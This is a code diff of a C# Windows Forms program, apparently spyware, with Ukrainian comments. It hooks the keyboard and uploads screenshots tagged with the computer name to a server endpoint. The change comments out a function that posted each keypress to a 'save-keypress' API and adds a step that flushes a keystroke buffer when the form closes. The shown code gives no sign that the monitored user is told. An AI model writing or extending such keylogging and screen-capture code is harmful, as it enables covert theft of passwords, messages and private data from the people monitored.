@@ -58,32 +58,32 @@ namespace Last5Launching
         }
 
 
-        public async Task SendKeyPressToServer(string keyPressed)
-        {
-            string computerName = Environment.MachineName;
+        //public async Task SendKeyPressToServer(string keyPressed)
+        //{
+        //    string computerName = Environment.MachineName;
 
-            using (HttpClient client = new HttpClient())
-            {
-                var data = new Dictionary<string, string>
-                {
-                    { "computerName", computerName },
-                    { "keyPressed", keyPressed }
-                };
+        //    using (HttpClient client = new HttpClient())
+        //    {
+        //        var data = new Dictionary<string, string>
+        //        {
+        //            { "computerName", computerName },
+        //            { "keyPressed", keyPressed }
+        //        };
 
-                var content = new FormUrlEncodedContent(data);
+        //        var content = new FormUrlEncodedContent(data);
 
-                var response = await client.PostAsync("http://localhost:5283/api/save-keypress", content);
+        //        var response = await client.PostAsync("http://localhost:5283/api/save-keypress", content);
 
-                if (response.IsSuccessStatusCode)
-                {
-                    Console.WriteLine("Натиснута клавіша збережена на сервері.");
-                }
-                else
-                {
-                    Console.WriteLine($"Помилка при збереженні натиснутої клавіші: {response.ReasonPhrase}");
-                }
-            }
-        }
+        //        if (response.IsSuccessStatusCode)
+        //        {
+        //            Console.WriteLine("Натиснута клавіша збережена на сервері.");
+        //        }
+        //        else
+        //        {
+        //            Console.WriteLine($"Помилка при збереженні натиснутої клавіші: {response.ReasonPhrase}");
+        //        }
+        //    }
+        //}
 
         public async Task SendScreenshotToServer(Bitmap screenshot)
         {
@@ -97,10 +97,10 @@ namespace Last5Launching
                 using (HttpClient client = new HttpClient())
                 {
                     var content = new MultipartFormDataContent
-                    {
-                        { new StringContent(computerName), "computerName" },
-                        { new ByteArrayContent(imageBytes), "screenshotFile", "screenshot.png" }
-                    };
+            {
+                { new StringContent(computerName), "computerName" },
+                { new ByteArrayContent(imageBytes), "screenshotFile", "screenshot.png" }
+            };
 
                     var response = await client.PostAsync("http://localhost:5283/api/save-screenshot", content);
 
@@ -116,10 +116,13 @@ namespace Last5Launching
             }
         }
 
+
         protected override void OnFormClosed(FormClosedEventArgs e)
         {
-            _keyboardListener.UnsetHook(); // Закриваємо хук клавіатури
+            _keyboardListener.FlushBufferOnExit(); // Відправка залишків буфера
+            _keyboardListener.UnsetHook(); // Зняття хука
             base.OnFormClosed(e);
         }
+
     }
 }
